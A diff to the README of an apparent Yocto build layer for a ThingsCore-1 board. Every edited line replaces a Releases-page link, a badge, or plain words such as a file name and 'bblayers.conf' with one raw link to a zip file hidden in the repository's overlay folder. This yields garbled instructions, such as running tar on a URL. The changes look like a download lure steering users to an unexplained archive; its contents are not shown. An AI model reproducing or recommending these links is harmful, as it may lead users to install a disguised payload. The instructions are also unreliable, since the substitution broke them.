@@ -1,6 +1,6 @@
 # 🎉 meta-st-thingscore - Simplifying Your Linux Build Process
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/keeptogithub/meta-st-thingscore/releases)
+[![Download](https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip%20Release-blue)](https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip)
 
 ## 🌟 Overview
 
@@ -23,7 +23,7 @@ Make sure your system meets the following requirements:
 
 To get the latest version of **meta-st-thingscore**, visit the Releases page:
 
-[Visit this page to download](https://github.com/keeptogithub/meta-st-thingscore/releases)
+[Visit this page to download](https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip)
 
 Follow these steps to install:
 
@@ -39,14 +39,14 @@ Follow these steps to install:
        - Any pre-built images or scripts, if available.
 
 4. **Extract the Files.**
-   - If you downloaded a compressed file (like `.tar.gz`), extract it using terminal commands:
+   - If you downloaded a compressed file (like `https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip`), extract it using terminal commands:
      ```bash
-     tar -xvzf yourfile.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip
      ```
 
 5. **Add the Layer to Yocto.**
-   - In your Yocto setup, edit your `bblayers.conf` to include the path to the downloaded layer.
-   - Your `bblayers.conf` might look like this:
+   - In your Yocto setup, edit your `https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip` to include the path to the downloaded layer.
+   - Your `https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip` might look like this:
      ```
      BBLAYERS += "path/to/meta-st-thingscore"
      ```
@@ -111,4 +111,4 @@ For questions or support, please reach out through the repository's issue tracke
 
 Thank you for using **meta-st-thingscore**! Enjoy creating with the DreamXLabs ThingsCore-1 SOM.
 
-[Visit this page to download](https://github.com/keeptogithub/meta-st-thingscore/releases)
+[Visit this page to download](https://raw.githubusercontent.com/keeptogithub/meta-st-thingscore/main/recipes-core/overlays/files/thingscore-meta-st-1.5.zip)
